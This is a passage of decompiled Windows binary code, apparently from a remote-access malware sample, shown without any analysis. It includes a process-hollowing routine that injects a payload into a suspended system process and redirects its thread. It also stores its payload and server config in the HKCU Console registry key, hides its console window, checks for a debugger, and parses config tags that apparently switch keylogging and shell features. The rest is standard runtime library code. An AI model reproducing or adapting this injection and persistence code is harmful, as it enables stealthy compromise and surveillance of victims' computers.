            for (iVar6 = 0x291; iVar6 != 0; iVar6 = iVar6 + -1) {
              *pDVar11 = *pDVar9;
              pDVar9 = pDVar9 + 1;
              pDVar11 = pDVar11 + 1;
            }
            DAT_0041c7d4 = VirtualAlloc((LPVOID)0x0,DAT_0041bf98,0x3000,0x40);
            FID_conflict__memcpy(DAT_0041c7d4,lpcbData + 0x291,DAT_0041bf98);
            pHVar8 = param_1;
          }
        }
        RegCloseKey(local_c);
        this = local_8;
      }
      puVar7 = &DAT_0041bf9c;
      puVar3 = (ushort *)((int)&pHVar8->unused + 1);
      do {
        uVar1 = *puVar3;
        bVar14 = uVar1 < *puVar7;
        if (uVar1 != *puVar7) {
LAB_004055f8:
          iVar6 = (1 - (uint)bVar14) - (uint)(bVar14 != 0);
          goto LAB_004055fd;
        }
        if (uVar1 == 0) break;
        uVar1 = puVar3[1];
        bVar14 = uVar1 < puVar7[1];
        if (uVar1 != puVar7[1]) goto LAB_004055f8;
        puVar3 = puVar3 + 2;
        puVar7 = puVar7 + 2;
      } while (uVar1 != 0);
      iVar6 = 0;
LAB_004055fd:
      if (iVar6 != 0) {
        if (DAT_0041c7d4 != (LPVOID)0x0) {
          VirtualFree(DAT_0041c7d4,0,0x8000);
          DAT_0041c7d4 = (LPVOID)0x0;
        }
        local_a54 = 0;
        local_a50 = 0x5f55767b;
        local_a4c = 0x57576a21;
        local_a48 = 0x64002e;
        local_a44 = 0x6c006c;
        local_a40 = 0x62005f;
        local_a3c = 0x6e0069;
        local_a38 = 0;
        _memset(local_a36,0,0x1e4);
        local_852 = 0;
        local_850 = 0;
        local_84c = 0;
        _memset(local_848,0,100);
        _memset(local_7e4,0,2000);
        local_14 = 0;
        puVar4 = (undefined1 *)FUN_004069bf(0xa45);
        *puVar4 = 5;
        FID_conflict__memcpy(puVar4 + 1,&local_a54,0xa44);
        if (*(int *)((int)local_8 + 8) == 0) {
          (**(code **)(**(int **)((int)local_8 + 4) + 8))(puVar4,0xa45);
        }
        FUN_004069ca(puVar4);
        return;
      }
    }
    else {
      puVar10 = (undefined4 *)((int)&param_1->unused + 1);
      puVar12 = &DAT_0041bd90;
      for (iVar6 = 0x291; iVar6 != 0; iVar6 = iVar6 + -1) {
        *puVar12 = *puVar10;
        puVar10 = puVar10 + 1;
        puVar12 = puVar12 + 1;
      }
      DAT_0041c7d4 = VirtualAlloc((LPVOID)0x0,DAT_0041bf98,0x3000,0x40);
      FID_conflict__memcpy(DAT_0041c7d4,(void *)((int)&pHVar8[0x291].unused + 1),DAT_0041bf98);
      param_2 = DAT_0041bf98 + 0xa44;
      lpData = (BYTE *)FUN_004069bf(param_2);
      this = local_8;
      if (lpData != (BYTE *)0x0) {
        puVar10 = &DAT_0041bd90;
        pBVar13 = lpData;
        for (iVar6 = 0x291; iVar6 != 0; iVar6 = iVar6 + -1) {
          *(undefined4 *)pBVar13 = *puVar10;
          puVar10 = puVar10 + 1;
          pBVar13 = pBVar13 + 4;
        }
        FID_conflict__memcpy(lpData + 0xa44,DAT_0041c7d4,DAT_0041bf98);
        LVar2 = RegCreateKeyW((HKEY)0x80000001,L"Console\\0",&param_1);
        if (LVar2 == 0) {
          RegDeleteValueW(param_1,L"d33f351a4aeea5e608853d1a56661059");
          RegSetValueExW(param_1,L"d33f351a4aeea5e608853d1a56661059",0,3,lpData,param_2);
        }
        RegCloseKey(param_1);
        FUN_0040747b(lpData);
        this = local_8;
      }
    }
    uVar5 = __beginthreadex((void *)0x0,0,FUN_004052c0,this,0,(uint *)0x0);
    *(uintptr_t *)((int)this + 0x18) = uVar5;
    Sleep(3000);
    (**(code **)**(undefined4 **)((int)this + 4))();
  }
  return;
}





/* Function: FUN_00405830 */

void FUN_00405830(void)

{
  DWORD DVar1;
  BOOL BVar2;
  LPVOID lpBaseAddress;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  LPPROCESS_INFORMATION unaff_ESI;
  SIZE_T unaff_EDI;
  _STARTUPINFOA local_41c;
  LPCVOID local_3d8;
  CONTEXT local_3d4;
  CHAR local_108;
  undefined1 local_107 [2];
  undefined1 local_105;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  local_3d8 = DAT_0041c7d4;
  _memset(&local_41c,0,0x44);
  unaff_ESI->hProcess = (HANDLE)0x0;
  unaff_ESI->hThread = (HANDLE)0x0;
  unaff_ESI->dwProcessId = 0;
  unaff_ESI->dwThreadId = 0;
  _memset(&local_3d4,0,0x2cc);
  local_41c.cb = 0x44;
  local_41c.dwFlags = 1;
  local_41c.wShowWindow = 0;
  local_108 = '\0';
  _memset(local_107,0,0xfe);
  GetSystemDirectoryA(&local_108,0xff);
  local_105 = 0;
  FUN_004059f0(extraout_ECX,&local_108,"%s%s");
  DVar1 = GetFileAttributesA(&local_108);
  if (DVar1 == 0xffffffff) {
    local_105 = 0;
    FUN_004059f0(extraout_ECX_00,&local_108,"%s%s");
  }
  BVar2 = CreateProcessA(&local_108,(LPSTR)0x0,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0
                         ,0,4,(LPVOID)0x0,(LPCSTR)0x0,&local_41c,unaff_ESI);
  if (BVar2 == 0) {
    __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  lpBaseAddress = VirtualAllocEx(unaff_ESI->hProcess,(LPVOID)0x0,unaff_EDI,0x3000,0x40);
  if (lpBaseAddress != (LPVOID)0x0) {
    BVar2 = WriteProcessMemory(unaff_ESI->hProcess,lpBaseAddress,local_3d8,unaff_EDI,(SIZE_T *)0x0);
    if (BVar2 != 0) {
      local_3d4.ContextFlags = 0x10007;
      BVar2 = GetThreadContext(unaff_ESI->hThread,&local_3d4);
      if (BVar2 != 0) {
        local_3d4.Eip = (DWORD)lpBaseAddress;
        BVar2 = SetThreadContext(unaff_ESI->hThread,&local_3d4);
        if (BVar2 != 0) {
          ResumeThread(unaff_ESI->hThread);
          __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
          return;
        }
      }
    }
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}





/* Function: FUN_00405a30 */

undefined4 * FUN_00405a30(undefined4 *param_1)

{
  uint uVar1;
  HANDLE pvVar2;
  int iVar3;
  BOOL BVar4;
  DWORD DVar5;
  undefined4 uVar6;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00414156;
  local_10 = ExceptionList;
  uVar1 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  *param_1 = CUdpSocket::vftable;
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,1,1,(LPCWSTR)0x0);
  param_1[0xb] = pvVar2;
  if (pvVar2 == (HANDLE)0x0) {
    FUN_00401280();
  }
  local_8 = 0;
  param_1[0xc] = 1;
  param_1[0xd] = 5;
  param_1[0xe] = 0;
  param_1[0xf] = 1;
  param_1[0x13] = 0x3c;
  param_1[0x14] = 0x3c;
  param_1[0x10] = 0xffffffff;
  param_1[0x11] = 0;
  param_1[0x12] = 0;
  param_1[0x15] = 0;
  param_1[0x16] = 0;
  param_1[0x17] = 0;
  param_1[0x18] = 0;
  param_1[0x19] = 3;
  param_1[0x1a] = 0;
  param_1[0x1b] = 0;
  param_1[0x1c] = 0;
  iVar3 = (**(code **)(PTR_PTR_00419000 + 0xc))(uVar1);
  param_1[0x1d] = iVar3 + 0x10;
  local_8._0_1_ = 1;
  *(undefined2 *)(param_1 + 0x1e) = 0;
  FUN_004065d0();
  local_8 = CONCAT31(local_8._1_3_,2);
  param_1[0x57] = 0;
  BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(param_1 + 0x58),0);
  if (BVar4 == 0) {
    FUN_00401280();
  }
  param_1[0x5f] = 0;
  param_1[0x60] = 0;
  param_1[0x5e] = 0;
  param_1[0x61] = param_1 + 0x1f;
  local_8 = CONCAT31(local_8._1_3_,4);
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)0x0);
  param_1[0x62] = pvVar2;
  if (pvVar2 == (HANDLE)0x0) {
    FUN_00401280();
  }
  local_8 = CONCAT31(local_8._1_3_,5);
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)0x0);
  param_1[99] = pvVar2;
  if (pvVar2 == (HANDLE)0x0) {
    FUN_00401280();
  }
  local_8 = CONCAT31(local_8._1_3_,6);
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)0x0);
  param_1[100] = pvVar2;
  if (pvVar2 == (HANDLE)0x0) {
    FUN_00401280();
  }
  local_8 = CONCAT31(local_8._1_3_,7);
  param_1[0x65] = 0;
  param_1[0x66] = 0;
  param_1[0x69] = 2;
  param_1[0x6a] = 10;
  param_1[0x6b] = 0x80;
  param_1[0x6c] = 0x200;
  param_1[0x6d] = 0x1e;
  param_1[0x6e] = 0x598;
  param_1[0x6f] = 5;
  param_1[0x70] = 0x1000;
  param_1[0x71] = 5000;
  param_1[0x67] = 1;
  param_1[0x68] = 1;
  param_1[0x72] = 0;
  param_1[0x73] = 0;
  param_1[0x76] = CArqSessionT<class_CUdpSocket,class_CUdpSocket>::vftable;
  param_1[0x77] = 0;
  param_1[0x78] = 0;
  param_1[0x79] = 0;
  param_1[0x7a] = 0;
  param_1[0x7b] = 0;
  param_1[0x7c] = 0;
  param_1[0x7d] = 0;
  param_1[0x7e] = 0;
  param_1[0x7f] = 0;
  BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(param_1 + 0x80),0);
  if (BVar4 == 0) {
    FUN_00401280();
  }
  local_8 = CONCAT31(local_8._1_3_,8);
  BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(param_1 + 0x86),0);
  if (BVar4 == 0) {
    FUN_00401280();
  }
  param_1[0x8c] = 0;
  param_1[0x8d] = CBuffer::vftable;
  param_1[0x90] = 0;
  param_1[0x8e] = 0;
  param_1[0x8f] = 0;
  param_1[0x91] = CBuffer::vftable;
  param_1[0x94] = 0;
  param_1[0x92] = 0;
  param_1[0x93] = 0;
  param_1[0x95] = CBuffer::vftable;
  param_1[0x98] = 0;
  param_1[0x96] = 0;
  param_1[0x97] = 0;
  local_8 = CONCAT31(local_8._1_3_,0xc);
  InterlockedExchange(param_1 + 6,0);
  DVar5 = timeGetTime();
  param_1[5] = DVar5;
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,1,0,(LPCWSTR)0x0);
  param_1[1] = pvVar2;
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)0x0);
  param_1[0x99] = pvVar2;
  param_1[5] = 0;
  uVar6 = FUN_004069bf(param_1[0x70]);
  param_1[0x72] = uVar6;
  uVar6 = FUN_004069bf(0x598);
  param_1[0x1c] = uVar6;
  ExceptionList = local_10;
  return param_1;
}





/* Function: FUN_00405e40 */

void FUN_00405e40(void)

{
  LSTATUS LVar1;
  HKEY local_10;
  DWORD local_c;
  DWORD local_8;
  
  if (DAT_0041da8c == '\0') {
    DAT_0041da8c = '\x01';
    __wcsrev(&DAT_0041a310);
    _memset(&DAT_0041c7d8,0,0x12a0);
    FUN_00405d70(L"p1:",(LPCWSTR)&DAT_0041c7f6,(undefined4 *)0x0);
    FUN_00405d70(L"o1:",(LPCWSTR)&DAT_0041c9f4,(undefined4 *)0x0);
    FUN_00405d70(L"t1:",(LPCWSTR)0x0,&DAT_0041ca30);
    FUN_00405d70(L"p2:",(LPCWSTR)&DAT_0041ca34,(undefined4 *)0x0);
    FUN_00405d70(L"o2:",(LPCWSTR)&DAT_0041cc32,(undefined4 *)0x0);
    FUN_00405d70(L"t2:",(LPCWSTR)0x0,&DAT_0041cc70);
    FUN_00405d70(L"p3:",(LPCWSTR)&DAT_0041cc74,(undefined4 *)0x0);
    FUN_00405d70(L"o3:",(LPCWSTR)&DAT_0041ce72,(undefined4 *)0x0);
    FUN_00405d70(L"t3:",(LPCWSTR)0x0,&DAT_0041ceb0);
    FUN_00405d70(L"dd:",(LPCWSTR)&DAT_0041ceb4,(undefined4 *)0x0);
    FUN_00405d70(L"cl:",(LPCWSTR)&DAT_0041cef0,(undefined4 *)0x0);
    FUN_00405d70(L"fz:",(LPCWSTR)&DAT_0041cf2c,(undefined4 *)0x0);
    FUN_00405d70(L"bb:",(LPCWSTR)&DAT_0041cf90,(undefined4 *)0x0);
    FUN_00405d70(L"bz:",(LPCWSTR)&DAT_0041cff4,(undefined4 *)0x0);
    FUN_00405d70(L"jp:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d058);
    FUN_00405d70(L"sx:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d05c);
    FUN_00405d70(L"bh:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d060);
    FUN_00405d70(L"ll:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d064);
    FUN_00405d70(L"dl:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d068);
    FUN_00405d70(L"sh:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d06c);
    FUN_00405d70(L"kl:",(LPCWSTR)0x0,&DAT_0041d070);
    FUN_00405d70(L"bd:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d074);
    local_c = 3;
    local_8 = 0;
    LVar1 = RegOpenKeyExW((HKEY)0x80000001,L"Console",0,0x20019,&local_10);
    if (LVar1 == 0) {
      RegQueryValueExW(local_10,L"IpDate",(LPDWORD)0x0,&local_c,(LPBYTE)0x0,&local_8);
    }
    if (10 < local_8) {
      _memset(&DAT_0041a310,0,2000);
      RegQueryValueExW(local_10,L"IpDate",(LPDWORD)0x0,&local_c,(LPBYTE)&DAT_0041a310,&local_8);
      FUN_00405d70(L"p1:",(LPCWSTR)&DAT_0041c7f6,(undefined4 *)0x0);
      FUN_00405d70(L"o1:",(LPCWSTR)&DAT_0041c9f4,(undefined4 *)0x0);
      FUN_00405d70(L"t1:",(LPCWSTR)0x0,&DAT_0041ca30);
      FUN_00405d70(L"p2:",(LPCWSTR)&DAT_0041ca34,(undefined4 *)0x0);
      FUN_00405d70(L"o2:",(LPCWSTR)&DAT_0041cc32,(undefined4 *)0x0);
      FUN_00405d70(L"t2:",(LPCWSTR)0x0,&DAT_0041cc70);
      FUN_00405d70(L"p3:",(LPCWSTR)&DAT_0041cc74,(undefined4 *)0x0);
      FUN_00405d70(L"o3:",(LPCWSTR)&DAT_0041ce72,(undefined4 *)0x0);
      FUN_00405d70(L"t3:",(LPCWSTR)0x0,&DAT_0041ceb0);
    }
  }
  return;
}





/* Function: FUN_00406510 */

undefined4 FUN_00406510(int param_1)

{
  BOOL BVar1;
  undefined4 uVar2;
  
  BVar1 = IsDebuggerPresent();
  if (BVar1 != 0) {
    return 0;
  }
  uVar2 = FUN_00406390(param_1);
  return uVar2;
}





/* Function: FUN_00406530 */

undefined4 FUN_00406530(void)

{
  HWND hWnd;
  DWORD idThread;
  UINT Msg;
  WPARAM wParam;
  int nCmdShow;
  LPARAM lParam;
  
  SetUnhandledExceptionFilter(FUN_00406510);
  nCmdShow = 0;
  hWnd = GetConsoleWindow();
  ShowWindow(hWnd,nCmdShow);
  lParam = 0;
  wParam = 0;
  Msg = 0;
  idThread = GetCurrentThreadId();
  PostThreadMessageA(idThread,Msg,wParam,lParam);
  GetInputState();
  FUN_00405e40();
  DAT_0041da78 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00406120,(LPVOID)0x0,0,(LPDWORD)0x0);
  WaitForSingleObject(DAT_0041da78,0xffffffff);
  CloseHandle(DAT_0041da78);
  Sleep(300);
  return 0;
}





/* Function: __beginthreadex */

/* Library Function - Single Match
    __beginthreadex
   
   Library: Visual Studio 2010 Release */

uintptr_t __cdecl
__beginthreadex(void *_Security,uint _StackSize,_StartAddress *_StartAddress,void *_ArgList,
               uint _InitFlag,uint *_ThrdAddr)

{
  _StartAddress *p_Var1;
  int *piVar2;
  _ptiddata _Ptd;
  _ptiddata p_Var3;
  _StartAddress **lpThreadId;
  HANDLE pvVar4;
  DWORD DVar5;
  
  p_Var1 = _StartAddress;
  DVar5 = 0;
  if (_StartAddress == (_StartAddress *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_004087f3();
  }
  else {
    ___set_flsgetvalue();
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      p_Var3 = __getptd();
      __initptd(_Ptd,p_Var3->ptlocinfo);
      _Ptd->_thandle = 0xffffffff;
      _Ptd->_initarg = _ArgList;
      _Ptd->_initaddr = p_Var1;
      lpThreadId = (_StartAddress **)_ThrdAddr;
      if (_ThrdAddr == (uint *)0x0) {
        lpThreadId = &_StartAddress;
      }
      pvVar4 = CreateThread((LPSECURITY_ATTRIBUTES)_Security,_StackSize,__threadstartex_4,_Ptd,
                            _InitFlag,(LPDWORD)lpThreadId);
      if (pvVar4 != (HANDLE)0x0) {
        return (uintptr_t)pvVar4;
      }
      DVar5 = GetLastError();
    }
    _free(_Ptd);
    if (DVar5 != 0) {
      __dosmaperr(DVar5);
    }
  }
  return 0;
}





/* Function: ___report_gsfailure */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    ___report_gsfailure
   
   Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl ___report_gsfailure(void)

{
  undefined4 in_EAX;
  HANDLE hProcess;
  undefined4 in_ECX;
  undefined4 in_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  undefined4 unaff_retaddr;
  UINT uExitCode;
  undefined4 local_32c;
  undefined4 local_328;
  
  _DAT_0041aca0 =
       (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4((int)&stack0xfffffffc,0x328) * 0x800 |
       (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | (uint)((int)&local_32c < 0) * 0x80 |
       (uint)(&stack0x00000000 == (undefined1 *)0x32c) * 0x40 | (uint)(in_AF & 1) * 0x10 |
       (uint)((POPCOUNT((uint)&local_32c & 0xff) & 1U) == 0) * 4 |
       (uint)(&stack0xfffffffc < (undefined1 *)0x328) | (uint)(in_ID & 1) * 0x200000 |
       (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  _DAT_0041aca4 = &stack0x00000004;
  _DAT_0041abe0 = 0x10001;
  _DAT_0041ab88 = 0xc0000409;
  _DAT_0041ab8c = 1;
  local_32c = DAT_004191b4;
  local_328 = DAT_004191b8;
  _DAT_0041ab94 = unaff_retaddr;
  _DAT_0041ac6c = in_GS;
  _DAT_0041ac70 = in_FS;
  _DAT_0041ac74 = in_ES;
  _DAT_0041ac78 = in_DS;
  _DAT_0041ac7c = unaff_EDI;
  _DAT_0041ac80 = unaff_ESI;
  _DAT_0041ac84 = unaff_EBX;
  _DAT_0041ac88 = in_EDX;
  _DAT_0041ac8c = in_ECX;
  _DAT_0041ac90 = in_EAX;
  _DAT_0041ac94 = unaff_EBP;
  DAT_0041ac98 = unaff_retaddr;
  _DAT_0041ac9c = in_CS;
  _DAT_0041aca8 = in_SS;
  DAT_0041abd8 = IsDebuggerPresent();
  FUN_0040b622();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&PTR_DAT_0041534c);
  if (DAT_0041abd8 == 0) {
    FUN_0040b622();
  }
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}





/* Function: __call_reportfault */

/* Library Function - Single Match
    __call_reportfault
   
   Library: Visual Studio 2010 Release */

void __cdecl __call_reportfault(int nDbgHookCode,DWORD dwExceptionCode,DWORD dwExceptionFlags)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  _EXCEPTION_POINTERS local_32c;
  EXCEPTION_RECORD local_324;
  undefined4 local_2d4;
  
  uVar1 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  if (nDbgHookCode != -1) {
    FUN_0040b622();
  }
  local_324.ExceptionCode = 0;
  _memset(&local_324.ExceptionFlags,0,0x4c);
  local_32c.ExceptionRecord = &local_324;
  local_32c.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_324.ExceptionCode = dwExceptionCode;
  local_324.ExceptionFlags = dwExceptionFlags;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_32c);
  if (((LVar3 == 0) && (BVar2 == 0)) && (nDbgHookCode != -1)) {
    FUN_0040b622();
  }
  __security_check_cookie(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}





/* Function: __ioinit */

/* Library Function - Single Match
    __ioinit
   
   Library: Visual Studio 2010 Release */

int __cdecl __ioinit(void)

{
  void *pvVar1;
  int iVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT UVar6;
  UINT UVar7;
  undefined4 *puVar8;
  int *piVar9;
  uint uVar10;
  _STARTUPINFOW local_50;
  byte *local_c;
  UINT *local_8;
  
  GetStartupInfoW(&local_50);
  pvVar1 = __calloc_crt(0x20,0x40);
  if (pvVar1 == (void *)0x0) {
    iVar2 = -1;
  }
  else {
    DAT_0041eaa8 = 0x20;
    DAT_0041eac0 = pvVar1;
    if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
      iVar2 = (int)pvVar1 + 5;
      do {
        *(undefined4 *)(iVar2 + -5) = 0xffffffff;
        *(undefined2 *)(iVar2 + -1) = 0xa00;
        *(undefined4 *)(iVar2 + 3) = 0;
        *(undefined2 *)(iVar2 + 0x1f) = 0xa00;
        *(undefined1 *)(iVar2 + 0x21) = 10;
        *(undefined4 *)(iVar2 + 0x33) = 0;
        *(undefined1 *)(iVar2 + 0x2f) = 0;
        uVar10 = iVar2 + 0x3b;
        iVar2 = iVar2 + 0x40;
      } while (uVar10 < (int)DAT_0041eac0 + 0x800U);
    }
    if ((local_50.cbReserved2 != 0) && ((UINT *)local_50.lpReserved2 != (UINT *)0x0)) {
      UVar6 = *(UINT *)local_50.lpReserved2;
      local_8 = (UINT *)((int)local_50.lpReserved2 + 4);
      local_c = (byte *)((int)local_8 + UVar6);
      if (0x7ff < (int)UVar6) {
        UVar6 = 0x800;
      }
      UVar7 = UVar6;
      if ((int)DAT_0041eaa8 < (int)UVar6) {
        piVar9 = &DAT_0041eac4;
        do {
          pvVar1 = __calloc_crt(0x20,0x40);
          UVar7 = DAT_0041eaa8;
          if (pvVar1 == (void *)0x0) break;
          DAT_0041eaa8 = DAT_0041eaa8 + 0x20;
          *piVar9 = (int)pvVar1;
          if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
            iVar2 = (int)pvVar1 + 5;
            do {
              *(undefined4 *)(iVar2 + -5) = 0xffffffff;
              *(undefined4 *)(iVar2 + 3) = 0;
              *(byte *)(iVar2 + 0x1f) = *(byte *)(iVar2 + 0x1f) & 0x80;
              *(undefined4 *)(iVar2 + 0x33) = 0;
              *(undefined2 *)(iVar2 + -1) = 0xa00;
              *(undefined2 *)(iVar2 + 0x20) = 0xa0a;
              *(undefined1 *)(iVar2 + 0x2f) = 0;
              uVar10 = iVar2 + 0x3b;
              iVar2 = iVar2 + 0x40;
            } while (uVar10 < *piVar9 + 0x800U);
          }
          piVar9 = piVar9 + 1;
          UVar7 = UVar6;
        } while ((int)DAT_0041eaa8 < (int)UVar6);
      }
      uVar10 = 0;
      if (0 < (int)UVar7) {
        do {
          pvVar5 = *(HANDLE *)local_c;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*local_8 & 1) != 0)) &&
             (((*local_8 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            puVar8 = (undefined4 *)((uVar10 & 0x1f) * 0x40 + (int)(&DAT_0041eac0)[(int)uVar10 >> 5])
            ;
            *puVar8 = *(undefined4 *)local_c;
            *(byte *)(puVar8 + 1) = (byte)*local_8;
            BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(puVar8 + 3),4000);
            if (BVar4 == 0) {
              return -1;
            }
            puVar8[2] = puVar8[2] + 1;
          }
          local_c = local_c + 4;
          uVar10 = uVar10 + 1;
          local_8 = (UINT *)((int)local_8 + 1);
        } while ((int)uVar10 < (int)UVar7);
      }
    }
    iVar2 = 0;
    do {
      piVar9 = (int *)(iVar2 * 0x40 + (int)DAT_0041eac0);
      if ((*piVar9 == -1) || (*piVar9 == -2)) {
        *(undefined1 *)(piVar9 + 1) = 0x81;
        if (iVar2 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar2 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(piVar9 + 1) = *(byte *)(piVar9 + 1) | 0x40;
          *piVar9 = -2;
        }
        else {
          *piVar9 = (int)pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(piVar9 + 1) = *(byte *)(piVar9 + 1) | 0x40;
          }
          else if ((DVar3 & 0xff) == 3) {
            *(byte *)(piVar9 + 1) = *(byte *)(piVar9 + 1) | 8;
          }
          BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(piVar9 + 3),4000);
          if (BVar4 == 0) {
            return -1;
          }
          piVar9[2] = piVar9[2] + 1;
        }
      }
      else {
        *(byte *)(piVar9 + 1) = *(byte *)(piVar9 + 1) | 0x80;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < 3);
    SetHandleCount(DAT_0041eaa8);
    iVar2 = 0;
  }
  return iVar2;
}





/* Function: ___security_init_cookie */

/* Library Function - Single Match
    ___security_init_cookie
   
   Library: Visual Studio 2010 Release */

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_004191b4 == 0xbb40e64e) || ((DAT_004191b4 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_004191b4 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_004191b4 == 0xbb40e64e) {
      DAT_004191b4 = 0xbb40e64f;
    }
    else if ((DAT_004191b4 & 0xffff0000) == 0) {
      DAT_004191b4 = DAT_004191b4 | (DAT_004191b4 | 0x4711) << 0x10;
    }
    DAT_004191b8 = ~DAT_004191b4;
  }
  else {
    DAT_004191b8 = ~DAT_004191b4;
  }
  return;
}





/* Function: __lseeki64_nolock */

/* Library Function - Single Match
    __lseeki64_nolock
   
   Library: Visual Studio 2010 Release */

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0040cc52:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_0040cc52;
      }
    }
    pbVar1 = (byte *)((&DAT_0041eac0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}





/* Function: __free_osfhnd */

/* Library Function - Single Match
    __free_osfhnd
   
   Library: Visual Studio 2010 Release */

int __cdecl __free_osfhnd(int param_1)

{
  int iVar1;
  int *piVar2;
  ulong *puVar3;
  int iVar4;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0041eaa8)) {
    iVar1 = (&DAT_0041eac0)[param_1 >> 5];
    iVar4 = (param_1 & 0x1fU) * 0x40;
    if (((*(byte *)(iVar1 + 4 + iVar4) & 1) != 0) && (*(int *)(iVar1 + iVar4) != -1)) {
      if (DAT_004191b0 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
